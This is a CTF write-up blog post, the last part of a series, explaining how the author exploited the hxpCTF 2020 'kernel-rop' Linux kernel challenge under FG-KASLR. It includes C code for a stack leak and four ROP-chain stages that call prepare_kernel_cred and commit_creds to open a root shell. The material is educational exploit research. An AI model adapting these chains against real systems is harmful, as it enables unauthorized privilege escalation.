---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Learning Linux Kernel Exploitation - Part 3"
subtitle: ""
summary: "The final part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Full protection"
authors: [midas]
tags: []
categories: []
date: 2021-02-05T10:11:42+07:00
lastmod: 2021-02-05T10:11:42+07:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---
**This post is mirrored from its [original post at my blog](https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/), some texts/links here maybe broken.**

{{< toc >}}

## Preface
We have finally come to the last part of **Learning Linux Kernel Exploitation**. In the previous parts, I have walked you through my process of learning kernel pwn, from setting up the environment, to different exploit techniques that can be used against different mitigation features and scenarios. All of which was delivered using what were provided by `hxpCTF 2020` challenge `kernel-rop`. To the end of the last part, the only difference left between my setup and the original given challenge is `KASLR`. Therefore, in this post, I will be adding `KASLR` to the play, effectively revert back to the original given environment, then I will explain the exploit process based on [the actual writeup from the authors themselves](https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/).

Again, just like the last post, I won't re-explain what I have already done in the previous parts. You can always check them out.

{{% callout %}}
*Use the table of contents on the right to navigate to the section that you are interested in.*
{{% /callout %}}

Since this is essentially a challenge's writeup, I will provide the `TL;DR`:

{{% callout %}}
1. Run the system multiple times and read `/proc/kallsyms` -> Notice the system uses [FG-KASLR](https://lwn.net/Articles/824307/).
2. Find the address ranges that aren't affected by `FG-KASLR` -> Get a few gadgets, `kpti trampoline` and `ksymtab`.
3. Leak stack cookie and image base from the stack.
4. Stage 1: Leak `commit_creds()` using gadgets from (2) and `ksymtab`, then safely return to userland.
5. Stage 2: Leak `prepare_kernel_cred()` using gadgets from (2) and `ksymtab` (the same as (4)), then safely return to userland.
6. Stage 3: Call `prepare_kernel_cred(0)`, then safely return to userland and save the address of the returned `cred_struct`.
7. Stage 4: Call `commit_creds()` on the saved `cred_struct` from (6) -> open a root shell.
{{% /callout %}}

## About KASLR and FG-KASLR
`KASLR`, abbreviated for [Kernel address space layout randomization (KASLR)](https://lwn.net/Articles/569635/), is just like `ASLR` on userland, it randomizes the base address where the kernel image is loaded each time the system is booted. It can be enabled/disabled by adding `kaslr` or `nokaslr` under `-append` option.

To defeat userland `ASLR`, what we typically do is to leak an address in the section, calculate the base address of the section from it, then all the others addresses will be just offset from there since what gets randomize is the base address, while the offsets are always the same. This is also true for normal `KASLR`, where the image base is randomized, and all the others functions will be just a constant offset from it. If this is the case for us in this challenge, because we can read a lot of data from the stack, we can easily read an address of the kernel image `.text` section from there and we have already defeated `KASLR`. However, things are not that simple for us (as you might have thought, if it's that simple I probably won't make a separate post for it).

Booting the system several times and reading `/proc/kallsyms`, you will notice that most of the symbols get *randomized on their own*, so there addresses are not a constant offset from the kernel `.text` base like what we used to deal with. This is called [Function Granular KASLR](https://lwn.net/Articles/824307/). It's purpose is to prevent hackers from defeating `KASLR` in the traditional way, by "rearrange your kernel code at load time on a per-function level granularity, with only around a second added to boot time".

In theory, if everything in the kernel gets completely randomized, it will be almost impossible for us to gather useful gadgets from the kernel image. However, this novel mitigation feature still suffers from weaknesses, and we will take advantage of those to deliver a successful exploit.

## Gathering useful gadgets
The fine-grainness of `FG-KASLR` is imperfect, there are certain regions in the kernel that never get randomized. Here are the unaffected regions that are useful to us:
1. The functions from `_text` base to `__x86_retpoline_r15`, which is `_text+0x400dc6` are unaffected. Unfortunately, `commit_creds()` and `prepare_kernel_cred()` don't reside in this region, but we can still look for useful registers and memory manipulation gadgets from here.
2. KPTI trampoline `swapgs_restore_regs_and_return_to_usermode()` is unaffected.
3. The kernel symbol table `ksymtab`, starts at `_text+0xf85198` is unaffected. In here contains the offsets that can be used to calculate the addresses of `commit_creds()` and `prepare_kernel_cred()`.

For (1), here are the 3 gadgets that I used:
```C
unsigned long pop_rax_ret = image_base + 0x4d11UL; // pop rax; ret
unsigned long read_mem_pop1_ret = image_base + 0x4aaeUL; // mov eax, qword ptr [rax + 0x10]; pop rbp; ret;
unsigned long pop_rdi_rbp_ret = image_base + 0x38a0UL; // pop rdi; pop rbp; ret;
```

The first 2 gadgets can be used to read an arbitrary memory block, by simply popping its address subtract by 0x10 to `rax`. The third gadget is a normal `pop rdi` for functions' parameter.

For (3), here is the structure of an entry in `ksymtab` ([source](https://elixir.bootlin.com/linux/latest/source/include/linux/export.h#L60)):
```C
struct kernel_symbol {
	  int value_offset;
	  int name_offset;
	  int namespace_offset;
};
```

The `value_offset` is what we are interested in, it is simply the offset from the symbol entry's address in `ksymtab` to the actual symbol's address itself (you can verify this by attaching `gdb` to debug and inspect `ksymtab`). To get the address of `ksymtab` entries, we can also read them from `/proc/kallsyms`:
```bash
cat /proc/kallsyms | grep ksymtab_commit_creds
-> ffffffffb7f87d90 r __ksymtab_commit_creds
cat /proc/kallsyms | grep ksymtab_prepare_kernel_cred
-> ffffffffb7f8d4fc r __ksymtab_prepare_kernel_cred
```

To leak the image base address, since we can leak a huge amount of data from the kernel stack, we can attach the debugger and inspect the stack to look for any kernel address that belongs to unaffected region (1). There actually one at offset 38:
```C
void leak(void){
    unsigned n = 40;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];
    image_base = leak[38] - 0xa157ULL;
    kpti_trampoline = image_base + 0x200f10UL + 22UL;
    pop_rax_ret = image_base + 0x4d11UL;
    read_mem_pop1_ret = image_base + 0x4aaeUL;
    pop_rdi_rbp_ret = image_base + 0x38a0UL;
    ksymtab_prepare_kernel_cred = image_base + 0xf8d4fcUL;
    ksymtab_commit_creds = image_base + 0xf87d90UL;

    printf("[*] Leaked %zd bytes\n", r);
    printf("    --> Cookie: %lx\n", cookie);
    printf("    --> Image base: %lx\n", image_base);
}
```

## Stage 1: leaking commit_creds()
According to what I have gathered in the last step, my plan to leak `commit_creds()` is by reading the `value_offset` of `ksymtab_commit_creds`, then add them together. We will use our 2 memory read gadgets to read it, using the same ROP technique that I have introduced in [the last part](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/), then safely return to userland via `KPTI trampoline` to prepare for the next stage:
```C
void stage_1(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = ksymtab_commit_creds - 0x10; // rax <- __ksymtabs_commit_creds - 0x10
    payload[off++] = read_mem_pop1_ret; // rax <- [__ksymtabs_commit_creds]
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_commit_creds;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to leak commit_creds()");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```

You can clearly see that what I did was to pop `ksymtabs_commit_creds - 0x10` into `rax`, then use the second gadget to read the `value_offset` field, after this ROP chain returns to userland into the function I called `get_commit_creds`, the `value_offset` of `__ksymtabs_commit_creds` will be stored in `rax`.

{{% callout %}}
Even though there is a `pop rax` in `KPTI trampoline` and we use a dummy value to pop into it, our resulting `rax` that we have read is still recovered correctly, so we don't need to care about it.
{{% /callout %}}

```C
void get_commit_creds(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    commit_creds = ksymtab_commit_creds + (int)tmp_store;
    printf("    --> commit_creds: %lx\n", commit_creds);
    stage_2();
}
```

After returning from `kernel-mode`, we have to actually retrieve the value from `rax` to calculate the actual address of `commit_creds`. Notice that in the code, I used a variable called `tmp_store`, which is just an `unsigned long` global variable. This is a very convenient way to move the value from a register to memory using a small in-line assembly piece of code. Also remember to cast the value to `int`, because that is the data type in which `value_offset` is stored.

After that, I immediatelt make a call to `stage_2()` to continue the exploitation chain.

## Stage 2: leaking prepare_kernel_cred()
Nothing more to say in this stage, it is exactly the same as stage 1:
```C
void stage_2(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax_ret; // return address
    payload[off++] = ksymtab_prepare_kernel_cred - 0x10; // rax <- __ksymtabs_prepare_kernel_cred - 0x10
    payload[off++] = read_mem_pop1_ret; // rax <- [__ksymtabs_prepare_kernel_cred]
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_prepare_kernel_cred;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to leak prepare_kernel_cred()");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void get_prepare_kernel_cred(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store;
    printf("    --> prepare_kernel_cred: %lx\n", prepare_kernel_cred);
    stage_3();
}
```

And with that, we have all the addresses that we need for a privileges escalation chain.

## Stage 3: calling prepare_kernel_cred(0)
Because of the limited amount of gadgets that we have, I couldn't find an easy way to perform a ROP chain that calls `commit_creds(prepare_kernel_cred(0))` and pop a root shell in one go (recall that I used some bizarre gadgets in the last part, and those aren't in the regions which are unaffected by `FG-KASLR`). Therefore, I have to follow the technique used in the original writeup by the author, in which they split the chain into 2 parts: calling `prepare_kernel_cred(0)` in the first attempt, saving the return value in `rax` to memory, which is the address of the `cred_struct` to be commited, then calling `commit_creds()` using that saved value in another attempt. By doing this, we don't have to concern about the most difficult part in a privileges escalation ROP chain, which is how to move the return value of `prepare_kernel_cred(0)` in `rax` to `rdi` to pass to `commit_creds()`.
```C
void stage_3(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_rbp_ret; // return address
    payload[off++] = 0; // rdi <- 0
    payload[off++] = 0; // dummy rbp
    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)after_prepare_kernel_cred;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to call prepare_kernel_cred(0)");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

void after_prepare_kernel_cred(void){
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    returned_creds_struct = tmp_store;
    printf("    --> returned_creds_struct: %lx\n", returned_creds_struct);
    stage_4();
}
```

Notice that we can reuse `tmp_store` to store our returned `cred_struct` as well, very convenient.

## Stage 4: calling commit_creds() and open root shell
Finally, we use the ROP chain one last time to calle `commit_creds()`:
```C
void stage_4(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_rbp_ret; // return address
    payload[off++] = returned_creds_struct; // rdi <- returned_creds_struct
    payload[off++] = 0; // dummy rbp
    payload[off++] = commit_creds; // commit_creds(returned_creds_struct)
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = (unsigned long)get_shell;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to call commit_creds(returned_creds_struct)");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```

After stage 4, we have successfully opened a root shell under this fully protected environment.

{{% callout %}}
In the original writeup, the authors stated that some how the state is corrupted and they can only open `/dev/sda` to read the flag file while not being able to open a root shell. This doesn't seem to be the case for me since my exploit can open a stable shell just fine. I don't really know why it happens because the idea of the 2 exploits are the same, the only differences are in the way we code our exploit.
{{% /callout %}}

## Summary
And that concludes this series. We have come to this point where we have a collection of techniques to bypass all of the most modern mitigation features in the Linux kernel. Below is a summary of the techniques we have used accross 3 parts:
1. If the kernel has no protection, use `ret2usr`.
2. If it has `SMEP`, use `ROP` to `commit_creds(prepare_kernel_cred(0))`. 
3. If overflow is limited on the stack, use a `pivot gadget`.
4. If it has `KPTI`, modify `ROP` to use `KPTI trampoline` or `signal handler`.
5. If it has `SMAP`, stack pivot is no longer viable.
6. If it has `KASLR`, a single leak of a `.text` address is sufficient.
7. If it has `FG-KASLR`, make use of regions that are unaffected and `ksymtab`.

One more thing, I want to say thanks for all the supports and the kind words that I have received since I started posting this series. At first, my intention was only to write this as a documentation for myself and a few friends of mine. However, it turns out that a lot of people really appreciates this kind of technical posts, and it gets spread wider than I can ever expect. I am really grateful that my little work here is useful for the community.

## Appendix
The full exploit code is [a.c](a.c).
